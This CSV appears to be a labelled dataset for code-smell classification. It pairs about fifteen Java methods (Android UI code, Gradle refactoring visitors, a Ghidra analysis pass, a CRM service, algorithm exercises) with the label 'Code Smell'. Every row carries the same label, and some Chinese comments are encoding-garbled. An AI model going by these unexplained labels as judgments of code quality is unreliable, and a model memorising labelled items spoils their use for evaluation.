text,label,text_label
"public void toggleHidden(long dialogId,boolean hide,boolean request,boolean notify){
  ArrayList<TL_stories.PeerStories> removeFrom;
  ArrayList<TL_stories.PeerStories> insertTo;
  boolean remove=true;
  if (hide) {
    removeFrom=dialogListStories;
    insertTo=hiddenListStories;
  }
 else {
    removeFrom=hiddenListStories;
    insertTo=dialogListStories;
  }
  TL_stories.PeerStories removed=null;
  for (int i=0; i < removeFrom.size(); i++) {
    if (DialogObject.getPeerDialogId(removeFrom.get(i).peer) == dialogId) {
      if (remove) {
        removed=removeFrom.remove(i);
      }
 else {
        removed=removeFrom.get(i);
      }
      break;
    }
  }
  if (removed != null) {
    boolean found=false;
    for (int i=0; i < insertTo.size(); i++) {
      if (DialogObject.getPeerDialogId(insertTo.get(i).peer) == dialogId) {
        found=true;
        break;
      }
    }
    if (!found) {
      insertTo.add(0,removed);
      AndroidUtilities.cancelRunOnUIThread(sortStoriesRunnable);
      sortStoriesRunnable.run();
    }
  }
  if (notify) {
    NotificationCenter.getInstance(currentAccount).postNotificationName(NotificationCenter.storiesUpdated);
  }
  MessagesController.getInstance(currentAccount).checkArchiveFolder();
  if (request) {
    if (dialogId >= 0) {
      TLRPC.User user=MessagesController.getInstance(currentAccount).getUser(dialogId);
      user.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(Collections.singletonList(user),null,false,true);
      MessagesController.getInstance(currentAccount).putUser(user,false);
    }
 else {
      TLRPC.Chat chat=MessagesController.getInstance(currentAccount).getChat(-dialogId);
      chat.stories_hidden=hide;
      MessagesStorage.getInstance(currentAccount).putUsersAndChats(null,Collections.singletonList(chat),false,true);
      MessagesController.getInstance(currentAccount).putChat(chat,false);
    }
    TL_stories.TL_stories_togglePeerStoriesHidden req=new TL_stories.TL_stories_togglePeerStoriesHidden();
    req.peer=MessagesController.getInstance(currentAccount).getInputPeer(dialogId);
    req.hidden=hide;
    ConnectionsManager.getInstance(currentAccount).sendRequest(req,(response,error) -> {
    }
);
  }
}",1,Code Smell
"public static int ladderLength(String beginWord,String endWord,List<String> wordList){
  if (!wordList.contains(endWord))   return 0;
  Set<String> visited=new HashSet<>();
  Queue<String> q=new LinkedList<>();
  q.offer(beginWord);
  int length=0;
  while (!q.isEmpty()) {
    int size=q.size();
    length++;
    for (int i=0; i < size; i++) {
      String current=q.poll();
      for (int j=0; j < current.length(); j++) {
        char[] temp=current.toCharArray();
        for (char c='a'; c <= 'z'; c++) {
          temp[j]=c;
          String newWord=new String(temp);
          if (newWord.equals(endWord))           return length + 1;
          if (wordList.contains(newWord) && !visited.contains(newWord)) {
            q.offer(newWord);
            visited.add(newWord);
          }
        }
      }
    }
  }
  return 0;
}",1,Code Smell
"public static boolean deleteDirectory(File dirFile){
  if (!dirFile.exists() || !dirFile.isDirectory()) {
    return false;
  }
  boolean result;
  File[] files=dirFile.listFiles();
  if (files != null) {
    for (    File file : files) {
      if (file.isFile()) {
        result=new File(file.getAbsolutePath()).delete();
        if (!result)         return false;
      }
 else       if (file.isDirectory()) {
        result=deleteDirectory(file.getAbsolutePath());
        if (!result)         return false;
      }
    }
  }
  return dirFile.delete();
}
public static boolean deleteDirectory(String filePath){
  return deleteDirectory(new File(filePath));
}
",1,Code Smell
"@Override public void getFrame(MissionInit missionInit,ByteBuffer buffer){
  if (!this.videoParams.isWantDepth()) {
    getRGBFrame(buffer);
    return;
  }
  final int width=this.videoParams.getWidth();
  final int height=this.videoParams.getHeight();
  GL30.glBindFramebuffer(GL30.GL_READ_FRAMEBUFFER,Minecraft.getMinecraft().getFramebuffer().framebufferObject);
  GL30.glBindFramebuffer(GL30.GL_DRAW_FRAMEBUFFER,this.fbo.framebufferObject);
  GL30.glBlitFramebuffer(0,0,Minecraft.getMinecraft().getFramebuffer().framebufferWidth,Minecraft.getMinecraft().getFramebuffer().framebufferHeight,0,0,width,height,GL11.GL_COLOR_BUFFER_BIT | GL11.GL_DEPTH_BUFFER_BIT,GL11.GL_NEAREST);
  this.fbo.bindFramebuffer(true);
  glReadPixels(0,0,width,height,GL_RGBA,GL_UNSIGNED_BYTE,buffer);
  glReadPixels(0,0,width,height,GL_DEPTH_COMPONENT,GL_FLOAT,this.depthBuffer);
  this.fbo.unbindFramebuffer();
  float minval, maxval;
  if (this.videoParams.getDepthScaling() == null || this.videoParams.getDepthScaling().isAutoscale()) {
    minval=1;
    maxval=0;
    for (int i=0; i < width * height; i++) {
      float f=this.depthBuffer.get(i);
      if (f < minval)       minval=f;
      if (f > maxval)       maxval=f;
    }
  }
 else {
    minval=this.videoParams.getDepthScaling().getMin().floatValue();
    maxval=this.videoParams.getDepthScaling().getMax().floatValue();
    if (minval > maxval) {
      float t=minval;
      minval=maxval;
      maxval=t;
    }
  }
  float range=maxval - minval;
  if (range < 0.000001)   range=0.000001f;
  float scale=255 / range;
  for (int i=0; i < width * height; i++) {
    float f=this.depthBuffer.get(i);
    f=(f < minval ? minval : (f > maxval ? maxval : f));
    f-=minval;
    f*=scale;
    buffer.put(i * 4 + 3,(byte)f);
  }
  this.depthBuffer.clear();
}",1,Code Smell
"@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!(versionMatcher.matches(m) && m.getSelect() instanceof J.MethodInvocation && pluginMatcher.matches(m.getSelect()))) {
    return m;
  }
  List<Expression> pluginArgs=((J.MethodInvocation)m.getSelect()).getArguments();
  if (!(pluginArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String pluginId=(String)((J.Literal)pluginArgs.get(0)).getValue();
  if (pluginId == null || !StringUtils.matchesGlob(pluginId,pluginIdPattern)) {
    return m;
  }
  List<Expression> versionArgs=m.getArguments();
  try {
    if (versionArgs.get(0) instanceof J.Literal) {
      String currentVersion=(String)((J.Literal)versionArgs.get(0)).getValue();
      if (currentVersion == null) {
        return m;
      }
      String resolvedVersion=new DependencyVersionSelector(null,gradleProject,gradleSettings).select(new GroupArtifactVersion(pluginId,pluginId + "".gradle.plugin"",currentVersion),""classpath"",newVersion,versionPattern,ctx);
      acc.pluginIdToNewVersion.put(pluginId,resolvedVersion);
    }
 else     if (versionArgs.get(0) instanceof G.GString) {
      G.GString gString=(G.GString)versionArgs.get(0);
      if (gString == null || gString.getStrings().isEmpty() || !(gString.getStrings().get(0) instanceof G.GString.Value)) {
        return m;
      }
      G.GString.Value gStringValue=(G.GString.Value)gString.getStrings().get(0);
      String versionVariableName=gStringValue.getTree().toString();
      String resolvedPluginVersion=new DependencyVersionSelector(null,gradleProject,gradleSettings).select(new GroupArtifact(pluginId,pluginId + "".gradle.plugin""),""classpath"",newVersion,versionPattern,ctx);
      acc.versionPropNameToPluginId.put(versionVariableName,pluginId);
      acc.pluginIdToNewVersion.put(pluginId,resolvedPluginVersion);
    }
  }
 catch (  MavenDownloadingException e) {
  }
  return m;
}
@Override public J visitMethodInvocation(J.MethodInvocation method,ExecutionContext ctx){
  J.MethodInvocation m=(J.MethodInvocation)super.visitMethodInvocation(method,ctx);
  if (!(versionMatcher.matches(m) && m.getSelect() instanceof J.MethodInvocation && pluginMatcher.matches(m.getSelect()))) {
    return m;
  }
  List<Expression> pluginArgs=((J.MethodInvocation)m.getSelect()).getArguments();
  if (!(pluginArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String pluginId=(String)((J.Literal)pluginArgs.get(0)).getValue();
  if (pluginId == null || !StringUtils.matchesGlob(pluginId,pluginIdPattern)) {
    return m;
  }
  List<Expression> versionArgs=m.getArguments();
  if (!(versionArgs.get(0) instanceof J.Literal)) {
    return m;
  }
  String currentVersion=(String)((J.Literal)versionArgs.get(0)).getValue();
  if (currentVersion == null) {
    return m;
  }
  String resolvedVersion=acc.pluginIdToNewVersion.get(pluginId);
  if (resolvedVersion == null) {
    return m;
  }
  return m.withArguments(ListUtils.map(versionArgs,v -> ChangeStringLiteral.withStringValue((J.Literal)v,resolvedVersion)));
}",1,Code Smell
"private void highlightRowInternal(RecyclerListView.IntReturnCallback callback,int removeAfter,boolean canHighlightLater){
  if (removeHighlighSelectionRunnable != null) {
    AndroidUtilities.cancelRunOnUIThread(removeHighlighSelectionRunnable);
    removeHighlighSelectionRunnable=null;
  }
  RecyclerView.ViewHolder holder=findViewHolderForAdapterPosition(callback.run());
  if (holder != null) {
    positionSelector(highlightPosition=holder.getLayoutPosition(),holder.itemView,false,-1,-1,true);
    if (selectorDrawable != null) {
      final Drawable d=selectorDrawable.getCurrent();
      if (d instanceof TransitionDrawable) {
        if (onItemLongClickListener != null || onItemClickListenerExtended != null) {
          ((TransitionDrawable)d).startTransition(ViewConfiguration.getLongPressTimeout());
        }
 else {
          ((TransitionDrawable)d).resetTransition();
        }
      }
      if (Build.VERSION.SDK_INT >= 21) {
        selectorDrawable.setHotspot(holder.itemView.getMeasuredWidth() / 2,holder.itemView.getMeasuredHeight() / 2);
      }
    }
    if (selectorDrawable != null && selectorDrawable.isStateful()) {
      if (selectorDrawable.setState(getDrawableStateForSelector())) {
        invalidateDrawable(selectorDrawable);
      }
    }
    if (removeAfter > 0) {
      pendingHighlightPosition=null;
      AndroidUtilities.runOnUIThread(removeHighlighSelectionRunnable=() -> {
        removeHighlighSelectionRunnable=null;
        pendingHighlightPosition=null;
        if (selectorDrawable != null) {
          Drawable d=selectorDrawable.getCurrent();
          if (d instanceof TransitionDrawable) {
            ((TransitionDrawable)d).resetTransition();
          }
        }
        if (selectorDrawable != null && selectorDrawable.isStateful()) {
          selectorDrawable.setState(StateSet.NOTHING);
        }
      }
,removeAfter);
    }
  }
 else   if (canHighlightLater) {
    pendingHighlightPosition=callback;
  }
}",1,Code Smell
"static NodeArray merge(NodeArray a1,NodeArray a2){
  NodeArray merged=new NodeArray(a1.size() + a2.size());
  int i=0, j=0;
  var nodesWithLastScore=new IntHashSet();
  float lastAddedScore=Float.NaN;
  while (i < a1.size() && j < a2.size()) {
    if (a1.score()[i] < a2.score[j]) {
      if (a2.score[j] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a2.score[j];
      }
      if (nodesWithLastScore.add(a2.node[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      j++;
    }
 else     if (a1.score()[i] > a2.score[j]) {
      if (a1.score()[i] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a1.score()[i];
      }
      if (nodesWithLastScore.add(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      i++;
    }
 else {
      if (a1.score()[i] != lastAddedScore) {
        nodesWithLastScore.clear();
        lastAddedScore=a1.score()[i];
      }
      if (nodesWithLastScore.add(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      if (nodesWithLastScore.add(a2.node()[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      i++;
      j++;
    }
  }
  if (i < a1.size()) {
    while (i < a1.size && a1.score()[i] == lastAddedScore) {
      if (!nodesWithLastScore.contains(a1.node()[i])) {
        merged.addInOrder(a1.node()[i],a1.score()[i]);
      }
      i++;
    }
    System.arraycopy(a1.node,i,merged.node,merged.size,a1.size - i);
    System.arraycopy(a1.score,i,merged.score,merged.size,a1.size - i);
    merged.size+=a1.size - i;
  }
  if (j < a2.size()) {
    while (j < a2.size && a2.score[j] == lastAddedScore) {
      if (!nodesWithLastScore.contains(a2.node[j])) {
        merged.addInOrder(a2.node[j],a2.score[j]);
      }
      j++;
    }
    System.arraycopy(a2.node,j,merged.node,merged.size,a2.size - j);
    System.arraycopy(a2.score,j,merged.score,merged.size,a2.size - j);
    merged.size+=a2.size - j;
  }
  return merged;
}",1,Code Smell
"@Override public TreeVisitor<?,ExecutionContext> getScanner(GradleWrapperState acc){
  return Preconditions.or(new PropertiesVisitor<ExecutionContext>(){
    @Override public boolean isAcceptable(    SourceFile sourceFile,    ExecutionContext ctx){
      if (!super.isAcceptable(sourceFile,ctx)) {
        return false;
      }
      if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_PROPERTIES_LOCATION)) {
        acc.addGradleWrapperProperties=false;
      }
 else       if (!PathUtils.matchesGlob(sourceFile.getSourcePath(),""**/"" + WRAPPER_PROPERTIES_LOCATION_RELATIVE_PATH)) {
        return false;
      }
      Optional<BuildTool> maybeBuildTool=sourceFile.getMarkers().findFirst(BuildTool.class);
      if (!maybeBuildTool.isPresent()) {
        return false;
      }
      BuildTool buildTool=maybeBuildTool.get();
      if (buildTool.getType() != BuildTool.Type.Gradle) {
        return false;
      }
      GradleWrapper gradleWrapper=getGradleWrapper(ctx);
      VersionComparator versionComparator=requireNonNull(Semver.validate(isBlank(version) ? ""latest.release"" : version,null).getValue());
      int compare=versionComparator.compare(null,buildTool.getVersion(),gradleWrapper.getVersion());
      if (compare < 0) {
        acc.needsWrapperUpdate=true;
        acc.updatedMarker=buildTool.withVersion(gradleWrapper.getVersion());
        return true;
      }
 else {
        return compare == 0;
      }
    }
    @Override public Properties visitEntry(    Properties.Entry entry,    ExecutionContext ctx){
      if (!""distributionUrl"".equals(entry.getKey())) {
        return entry;
      }
      GradleWrapper gradleWrapper=getGradleWrapper(ctx);
      String currentDistributionUrl=entry.getValue().getText();
      if (!gradleWrapper.getPropertiesFormattedUrl().equals(currentDistributionUrl)) {
        acc.needsWrapperUpdate=true;
      }
      return entry;
    }
  }
,new TreeVisitor<Tree,ExecutionContext>(){
    @Override public boolean isAcceptable(    SourceFile sourceFile,    ExecutionContext ctx){
      if (!super.isAcceptable(sourceFile,ctx)) {
        return false;
      }
      if ((sourceFile instanceof Quark || sourceFile instanceof Remote) && equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_JAR_LOCATION)) {
        acc.addGradleWrapperJar=false;
        return true;
      }
      if (sourceFile instanceof PlainText) {
        if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_BATCH_LOCATION)) {
          acc.addGradleBatchScript=false;
          return true;
        }
 else         if (equalIgnoringSeparators(sourceFile.getSourcePath(),WRAPPER_SCRIPT_LOCATION)) {
          acc.addGradleShellScript=false;
          return true;
        }
      }
      return false;
    }
  }
);
}",1,Code Smell
"/** 
 * 灏唈ar鍖呴噷鐨勫姩鎬佸簱鍐欏叆鍒扮郴缁熺紦瀛樼洰褰�,浣跨敤缁濆璺緞鍔犺浇鍔ㄦ�佸簱
 * @param libName
 * @return
 */
private static String extractLibrary(String libName){
  return extractLibrary("""",libName);
}
/** 
 * 鐩稿璺緞鏂囦欢澶�
 * @param relativePath 鐩稿璺緞
 * @param libName 鍔ㄦ�佸簱璺緞
 * @return
 */
private static String extractLibrary(String relativePath,String libName){
  if (libName.trim().equals("""")) {
    return """";
  }
  String libFullName=getLibraryName(libName);
  String dir=getLibraryFold();
  if (!(relativePath.endsWith(""/"") || relativePath.endsWith(""\\""))) {
    relativePath=relativePath + ""/"";
  }
  String fileName=relativePath + dir + ""/""+ libFullName;
  InputStream in=LibraryLoad.class.getResourceAsStream(fileName);
  BufferedInputStream reader;
  FileOutputStream writer;
  File extractedLibFile=null;
  try {
    if (in == null) {
      in=new FileInputStream(fileName);
      if (in == null) {
        return """";
      }
    }
    String nativeTempDir=EXTRACT_PATH;
    if (!(nativeTempDir.endsWith(""/"") || nativeTempDir.endsWith(""\\""))) {
      nativeTempDir=nativeTempDir + ""/"";
    }
    extractedLibFile=new File(nativeTempDir + libFullName);
    reader=new BufferedInputStream(in);
    writer=new FileOutputStream(extractedLibFile);
    byte[] buffer=new byte[1024];
    while (true) {
      int len=reader.read(buffer);
      if (len == 0 || len == -1)       break;
      writer.write(buffer,0,len);
    }
    reader.close();
    writer.close();
    in.close();
  }
 catch (  Exception e) {
    System.out.println(""dynamic file[ "" + fileName + "" ] not found in project.please ensure you need this library."");
  }
  return extractedLibFile != null ? extractedLibFile.getAbsolutePath() : """";
}",1,Code Smell
"public void visit_CBRANCH(PcodeOp pcode,AbsEnv inOutEnv,AbsEnv tmpEnv){
  if (!isLastPcodeOfInstruction(pcode)) {
    Varnode target=pcode.getInput(0);
    Varnode condition=pcode.getInput(1);
    Address address=target.getAddress();
    if (!address.isLoadedMemoryAddress()) {
      return;
    }
    KSet conditionKSet=getKSet(condition,inOutEnv,tmpEnv,pcode);
    if (!conditionKSet.isFalse()) {
      AbsEnv oldEnv=context.getValueBefore(address);
      AbsEnv res=oldEnv.join(inOutEnv);
      if (res != null) {
        jumpOut=conditionKSet.isTrue();
        context.setValueBefore(address,res);
        context.insertToWorklist(address);
      }
    }
    return;
  }
  Address currentAddress=Utils.getAddress(pcode);
  Instruction fallThroughInstruction=GlobalState.flatAPI.getInstructionAfter(currentAddress);
  CFG cfg=CFG.getCFG(context.getFunction());
  if (fallThroughInstruction != null) {
    Address fallThoughAddress=fallThroughInstruction.getAddress();
    Varnode dst=pcode.getInput(0);
    assert (dst.getSpace() == GlobalState.flatAPI.getAddressFactory().getDefaultAddressSpace().getSpaceID());
    Address takenAddress=null;
    if (dst.isConstant()) {
      Logging.debug(""Skip relative offset into the indexed list of p-code operations"");
    }
 else     if (dst.isAddress()) {
      takenAddress=dst.getAddress();
    }
    cfg.addEdge(currentAddress,fallThoughAddress);
    cfg.addEdge(currentAddress,takenAddress);
  }
  cfg.refresh();
  isCBranch=true;
}",1,Code Smell
"@Override public void onAttachedToWindow(){
  super.onAttachedToWindow();
  if (springAnimation == null) {
    springAnimation=new SpringAnimation(this,ACTION_BAR_TRANSITION_PROGRESS_VALUE).setSpring(new SpringForce().setStiffness(1200f).setDampingRatio(SpringForce.DAMPING_RATIO_NO_BOUNCY)).addEndListener((animation,canceled,value,velocity) -> {
      ChatActivity chatActivity=parentEnterView.getParentFragment();
      ChatAvatarContainer chatAvatarContainer=chatActivity.getAvatarContainer();
      chatAvatarContainer.setClickable(value == 0);
      chatAvatarContainer.getAvatarImageView().setClickable(value == 0);
      ActionBar actionBar=chatActivity.getActionBar();
      if (value == 100 && parentEnterView.hasBotWebView()) {
        chatActivity.showHeaderItem(false);
        checkBotMenuItem();
        botMenuItem.setVisibility(VISIBLE);
        actionBar.setActionBarMenuOnItemClick(new ActionBar.ActionBarMenuOnItemClick(){
          @Override public void onItemClick(          int id){
            if (id == -1) {
              if (!webViewContainer.onBackPressed()) {
                onCheckDismissByUser();
              }
            }
 else             if (id == R.id.menu_reload_page) {
              if (webViewContainer.getWebView() != null) {
                webViewContainer.getWebView().animate().cancel();
                webViewContainer.getWebView().animate().alpha(0).start();
              }
              isLoaded=false;
              progressView.setLoadProgress(0);
              progressView.setAlpha(1f);
              progressView.setVisibility(VISIBLE);
              webViewContainer.setBotUser(MessagesController.getInstance(currentAccount).getUser(botId));
              webViewContainer.loadFlickerAndSettingsItem(currentAccount,botId,settingsItem);
              webViewContainer.reload();
            }
 else             if (id == R.id.menu_settings) {
              webViewContainer.onSettingsButtonPressed();
            }
          }
        }
);
      }
 else {
        chatActivity.showHeaderItem(true);
        if (botMenuItem != null) {
          botMenuItem.setVisibility(GONE);
        }
        actionBar.setActionBarMenuOnItemClick(actionBarOnItemClick);
      }
    }
);
  }
  NotificationCenter.getInstance(currentAccount).addObserver(this,NotificationCenter.webViewResultSent);
  NotificationCenter.getGlobalInstance().addObserver(this,NotificationCenter.didSetNewTheme);
}",1,Code Smell
"/** 
 * Determines if the class or interface represented by the specified node parameter is either the same as, or is a superclass or superinterface of, the class or interface represented by this node. It returns true if so;otherwise it returns  false. much like return this instanceof node
 */
public final boolean inheritFrom(final Node node){
  if (node == null)   return false;
  if (entity.name.equals(node.entity.name)) {
    return true;
  }
  final boolean isInterfaceNode=node instanceof InterfaceNode;
  final Queue<Node> interfaces=new LinkedList<>();
  if (isInterfaceNode && this.interfaces != null) {
    interfaces.addAll(this.interfaces);
  }
  Node parent=this.parent;
  while (parent != null) {
    if (isInterfaceNode) {
      interfaces.addAll(parent.interfaces);
    }
 else {
      if (node.entity.name.equals(parent.entity.name)) {
        return true;
      }
    }
    parent=parent.parent;
  }
  while (!interfaces.isEmpty()) {
    Node aInterface=interfaces.poll();
    if (node.entity.name.equals(aInterface.entity.name)) {
      return true;
    }
    if (aInterface.interfaces != null) {
      interfaces.addAll(aInterface.interfaces);
    }
  }
  return false;
}
",1,Code Smell
"private void positionMarker(){
  if (parentAlert.isStoryLocationPicker) {
    if (parentAlert.storyLocationPickerLatLong != null) {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(parentAlert.storyLocationPickerLatLong[0],parentAlert.storyLocationPickerLatLong[1]));
    }
 else     if (!locationDenied) {
      boolean reset=true;
      final File file=parentAlert.storyLocationPickerPhotoFile;
      final boolean isVideo=parentAlert.storyLocationPickerFileIsVideo;
      if (file != null) {
        try {
          if (isVideo) {
            MediaMetadataRetriever mediaMetadataRetriever=new MediaMetadataRetriever();
            mediaMetadataRetriever.setDataSource(file.getAbsolutePath());
            String location=mediaMetadataRetriever.extractMetadata(MediaMetadataRetriever.METADATA_KEY_LOCATION);
            if (location != null) {
              Matcher m=Pattern.compile(""([+\\-][0-9.]+)([+\\-][0-9.]+)"").matcher(location);
              if (m.find() && m.groupCount() == 2) {
                String latstr=m.group(1);
                String lonstr=m.group(2);
                try {
                  double lat=Double.parseDouble(latstr);
                  double lon=Double.parseDouble(lonstr);
                  AndroidUtilities.runOnUIThread(() -> resetMapPosition(lat,lon));
                  reset=false;
                }
 catch (                NumberFormatException ignored) {
                }
              }
            }
          }
 else {
            ExifInterface ei=new ExifInterface(file.getAbsolutePath());
            float[] latlong=new float[2];
            if (ei.getLatLong(latlong)) {
              AndroidUtilities.runOnUIThread(() -> resetMapPosition(latlong[0],latlong[1]));
              reset=false;
            }
          }
        }
 catch (        Exception e) {
        }
      }
      if (reset) {
        positionMarker(myLocation=getLastLocation());
      }
    }
 else {
      AndroidUtilities.runOnUIThread(() -> resetMapPosition(0,0));
    }
  }
 else {
    positionMarker(myLocation=getLastLocation());
  }
}
private void positionMarker(Location location){
  if (location == null) {
    return;
  }
  myLocation=new Location(location);
  if (map != null) {
    IMapsProvider.LatLng latLng=new IMapsProvider.LatLng(location.getLatitude(),location.getLongitude());
    if (adapter != null) {
      if (!searchedForCustomLocations && locationType != LOCATION_TYPE_BIZ) {
        adapter.searchPlacesWithQuery(null,myLocation,true);
      }
      adapter.setGpsLocation(myLocation);
    }
    if (!userLocationMoved) {
      userLocation=new Location(location);
      if (firstWas) {
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLng(latLng);
        map.animateCamera(position);
      }
 else {
        firstWas=true;
        IMapsProvider.ICameraUpdate position=ApplicationLoader.getMapsProvider().newCameraUpdateLatLngZoom(latLng,map.getMaxZoomLevel() - 4);
        map.moveCamera(position);
      }
    }
  }
 else {
    adapter.setGpsLocation(myLocation);
  }
}",1,Code Smell
"@Override @Transactional(rollbackFor=Exception.class) public void removeTeamMember(TeamMemberRemoveBO memberRemoveBO){
  if (CollUtil.isEmpty(memberRemoveBO.getMemberIds())) {
    return;
  }
  if (CollUtil.isEmpty(memberRemoveBO.getMemberIds())) {
    return;
  }
  if (ObjectUtil.isNull(memberRemoveBO.getModuleId())) {
    throw new BusinessException(ModuleCodeEnum.MODULE_ID_IS_NULL_ERROR);
  }
  if (ObjectUtil.isNull(memberRemoveBO.getDataId())) {
    throw new BusinessException(ModuleCodeEnum.DATA_ID_IS_NULL);
  }
  ModuleFieldDataCommon dataCommon=dataCommonService.getByDataId(memberRemoveBO.getDataId());
  if (memberRemoveBO.getMemberIds().contains(dataCommon.getOwnerUserId())) {
    throw new BusinessException(ModuleCodeEnum.TEAM_OWNER_CAN_NOT_BE_REMOVED);
  }
  ModuleEntity module=moduleService.getByModuleIdAndVersion(memberRemoveBO.getModuleId(),dataCommon.getVersion());
  String mainFieldValue=fieldDataProvider.queryValue(memberRemoveBO.getDataId(),module.getMainFieldId());
  lambdaUpdate().eq(ModuleTeamMember::getModuleId,memberRemoveBO.getModuleId()).eq(ModuleTeamMember::getDataId,memberRemoveBO.getDataId()).in(ModuleTeamMember::getUserId,memberRemoveBO.getMemberIds()).remove();
  List<ModuleDataOperationRecord> operationRecords=new ArrayList<>();
  for (  Long memberId : memberRemoveBO.getMemberIds()) {
    operationRecords.add(operationRecordService.initTeamUserEntity(module.getModuleId(),module.getVersion(),memberRemoveBO.getDataId(),mainFieldValue,memberId,ActionTypeEnum.REMOVE_TEAM_MEMBER));
  }
  MessageBO messageBO=new MessageBO();
  messageBO.setDataId(memberRemoveBO.getDataId());
  String msgValue="""";
  if (ObjectUtil.equal(1,memberRemoveBO.getMemberIds().size()) && ObjectUtil.equal(UserUtil.getUserId(),memberRemoveBO.getMemberIds().get(0))) {
    msgValue=""鎮ㄥ凡閫�鍑�"" + module.getName();
  }
 else {
    msgValue=""鎮ㄥ凡琚�"" + UserUtil.getUser().getNickname() + ""绉诲嚭""+ module.getName();
  }
  messageBO.setValue(msgValue);
  messageBO.setModuleId(module.getModuleId());
  messageBO.setModuleName(module.getName());
  messageBO.setTypeId(0L);
  messageBO.setTypeName(mainFieldValue);
  messageBO.setExtData(null);
  messageBO.setType(4);
  messageBO.setReceivers(memberRemoveBO.getMemberIds());
  messageBO.setCreateUserId(UserUtil.getUserId());
  ApplicationContextHolder.getBean(IMessageService.class).sendMessage(messageBO);
  operationRecordService.saveBatch(operationRecords);
  List<ModuleTeamMember> teamMembers=this.getTeamMemberByDataId(dataCommon.getModuleId(),dataCommon.getDataId());
  List<Long> memberIds=teamMembers.stream().map(ModuleTeamMember::getUserId).collect(Collectors.toList());
  dataCommon.setTeamMember(JSON.toJSONString(memberIds));
  dataCommon.setUpdateTime(DateUtil.date());
  dataCommonService.updateById(dataCommon);
  Map<String,Object> fieldValueMap=new HashMap<>(1);
  fieldValueMap.put(""teamMember"",memberIds);
  updateField(fieldValueMap,dataCommon.getDataId(),dataCommon.getModuleId());
}",1,Code Smell
"public static int maxCoins2(int[] arr){
  if (arr == null || arr.length == 0) {
    return 0;
  }
  if (arr.length == 1) {
    return arr[0];
  }
  int N=arr.length;
  int[] help=new int[N + 2];
  help[0]=1;
  help[N + 1]=1;
  for (int i=0; i < N; i++) {
    help[i + 1]=arr[i];
  }
  int[][] dp=new int[N + 2][N + 2];
  for (int i=1; i <= N; i++) {
    dp[i][i]=help[i - 1] * help[i] * help[i + 1];
  }
  for (int L=N; L >= 1; L--) {
    for (int R=L + 1; R <= N; R++) {
      int ans=help[L - 1] * help[L] * help[R + 1] + dp[L + 1][R];
      ans=Math.max(ans,help[L - 1] * help[R] * help[R + 1] + dp[L][R - 1]);
      for (int i=L + 1; i < R; i++) {
        ans=Math.max(ans,help[L - 1] * help[i] * help[R + 1] + dp[L][i - 1] + dp[i + 1][R]);
      }
      dp[L][R]=ans;
    }
  }
  return dp[1][N];
}",1,Code Smell
